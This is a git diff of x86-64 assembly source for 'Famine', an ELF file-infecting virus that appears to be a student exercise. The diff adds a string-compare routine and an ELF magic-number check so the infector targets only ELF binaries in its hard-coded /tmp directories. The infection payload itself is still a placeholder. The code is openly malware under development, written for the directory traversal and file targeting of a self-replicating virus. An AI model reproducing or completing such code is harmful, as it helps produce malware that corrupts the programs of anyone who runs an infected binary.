@@ -26,6 +26,7 @@ _start:
 newline db `\n`, 0x0
 
 _print:; (string rdi)
+	push r11
 	push rdx
 	push rbx
 	push rsi
@@ -55,6 +56,7 @@ _print:; (string rdi)
 	pop rsi
 	pop rbx
 	pop rdx
+	pop r11
 ret
 
 %endif; ========================================================================
@@ -148,7 +150,7 @@ _infect_dir:; (string rdi)
 		.loop_array_string:
 			add rsi, rcx
 			call _ft_strcmp
-			cmp rax, 0
+			cmp rax, 0x0
 			je .next_dir
 			xor rcx, rcx; = 0
 			.next_string:; seek next dir
@@ -240,6 +242,7 @@ ret
 _infect_file:
 	push r10
 	push r11
+	push rdx
 
 	%ifdef DEBUG
 		call _print; _print(rdi)
@@ -267,8 +270,20 @@ _infect_file:
 	syscall
 	push rdi
 	pop r11
-	cmp rax, 64
+	cmp rax, 64 ; if read return less than 64 bytes
 	jl .reset_stack
+
+	lea rdi, [rel elf_magic]
+	push 4
+	pop rdx
+	call _ft_strncmp
+	cmp rax, 0x0
+	jne .reset_stack ; not elf file
+
+	%ifdef DEBUG
+		mov rdi, rsi
+		call _print; _print(rdi)
+	%endif
 
 	add rsp, 64
 	; things here
@@ -284,6 +299,7 @@ _infect_file:
 	.return:
 		xor rax, rax
 
+	pop rdx
 	pop r11
 	pop r10
 ret
@@ -326,6 +342,28 @@ _ft_strlen:; (string rdi) - use rcx, rsi
 		pop rcx
 ret
 
+_ft_strncmp: ; (string rdi, string rsi, size_t rdx)
+	push rcx
+	dec rdx
+
+	xor rcx, rcx; = 0
+	.loop_char:
+		mov al, [rdi + rcx]
+		cmp al, [rsi + rcx]
+		jne .return
+		cmp al, 0x0
+		je .return
+		cmp rcx, rdx
+		je .return
+		inc rcx
+	jmp .loop_char
+	.return:
+		sub al, [rsi + rcx]
+
+	inc rdx
+	pop rcx
+ret
+
 _ft_strcmp: ; (string rdi, string rsi) - use rcx, rdi, rsi, rax
 	push rcx
 
@@ -363,6 +401,7 @@ ret
 
 ; ==============================================================================
 
+elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x0
 dotdir db `.`, 0x0, `..`, 0x0, 0x0
 directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 db `Famine version 1.0 (c)oded by lmartin`; sw4g signature
